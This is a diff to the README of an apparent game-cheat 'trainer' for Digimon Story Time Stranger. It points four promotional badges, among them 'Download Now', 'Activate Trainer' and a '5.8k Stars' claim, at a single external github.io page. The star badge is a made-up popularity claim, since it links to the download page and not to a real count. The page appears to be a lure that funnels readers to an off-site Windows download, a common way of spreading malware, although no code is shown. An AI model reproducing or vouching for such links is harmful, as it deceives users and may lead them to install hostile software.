@@ -2,10 +2,10 @@
 
 Digimon Story Time Stranger blends JRPG depth with creature evolution, letting you raise, train, and battle your Digimon in rich story-driven gameplay. But sometimes, grinding can get in the way of fun. The **Digimon Story Time Stranger Trainer** gives you direct control over money, items, stats, and battles—helping you focus on strategy and story without the slow grind.
 
-[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge\&logo=cloudflare)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.8k Stars](https://img.shields.io/badge/GitHub-⭐️%205.8k-orange?style=for-the-badge\&logo=github)](#)
-[![Activate Trainer](https://img.shields.io/badge/Activate%20Trainer-blue?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge\&logo=cloudflare)](https://digimon-story-time-stranger-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://digimon-story-time-stranger-trainer.github.io/.github/)
+[![⭐️ 5.8k Stars](https://img.shields.io/badge/GitHub-⭐️%205.8k-orange?style=for-the-badge\&logo=github)](https://digimon-story-time-stranger-trainer.github.io/.github/)
+[![Activate Trainer](https://img.shields.io/badge/Activate%20Trainer-blue?style=for-the-badge\&logo=rocket)](https://digimon-story-time-stranger-trainer.github.io/.github/)
 
 ---
 
